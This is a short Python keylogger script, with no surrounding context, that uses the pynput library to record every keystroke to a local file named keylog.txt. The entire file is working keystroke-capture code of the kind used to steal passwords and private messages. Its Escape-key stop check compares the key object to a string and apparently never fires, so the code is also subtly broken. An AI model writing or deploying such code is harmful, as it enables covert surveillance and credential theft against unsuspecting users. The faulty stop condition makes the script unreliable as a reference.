from pynput.keyboard import Listener

# File to store the keystrokes
log_file = "keylog.txt"

# Function to write keystrokes to the file
def on_press(key):
    try:
        # Logging the pressed key to the file
        with open(log_file, "a") as f:
            f.write(str(key).replace("'", ""))  # Remove extra quotes from the key representation
    except Exception as e:
        print(f"Error: {e}")

# Function to capture special key events (e.g., Enter, Backspace)
def on_release(key):
    # Stops the keylogger if the Escape key is pressed
    if key == 'Key.esc':
        return False

# Setting up the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
